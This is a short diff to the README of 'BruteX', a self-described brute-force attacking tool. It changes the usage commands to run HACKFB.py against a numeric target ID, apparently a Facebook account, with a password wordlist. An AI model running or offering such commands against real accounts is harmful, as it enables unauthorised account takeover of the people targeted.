@@ -58,9 +58,9 @@ BruteX is A bruteForce attacking tool
   
   cd BruteX
 
-  chmod 777 HACKFB
+  chmod 777 HACKFB.py
 
-  ./HACKFB -t 100006256286582 -w /sdcard/access.txt
+  python HACKFB.py -t 100006256286582 -w /sdcard/access.txt
 
 ```
 
